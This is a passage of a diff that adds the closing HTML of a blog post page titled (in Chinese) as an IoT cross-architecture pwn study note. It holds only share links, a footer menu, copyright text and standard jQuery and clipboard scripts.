+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&is_video=false&description=IOT安全学习之异构pwn技能栈"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=IOT安全学习之异构pwn技能栈&body=Check out this article: http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&title=IOT安全学习之异构pwn技能栈"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&title=IOT安全学习之异构pwn技能栈"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&title=IOT安全学习之异构pwn技能栈"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&title=IOT安全学习之异构pwn技能栈"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&name=IOT安全学习之异构pwn技能栈&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&t=IOT安全学习之异构pwn技能栈"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
